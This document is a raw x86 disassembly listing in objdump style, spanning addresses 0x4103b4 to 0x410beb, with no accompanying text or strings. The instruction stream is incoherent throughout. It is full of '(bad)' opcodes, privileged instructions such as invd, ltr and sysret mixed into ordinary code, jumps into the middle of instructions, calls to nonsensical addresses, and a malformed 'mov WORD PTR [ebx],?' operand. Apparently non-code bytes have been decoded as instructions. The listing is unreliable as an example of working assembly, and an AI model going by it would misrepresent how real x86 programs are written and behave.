  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
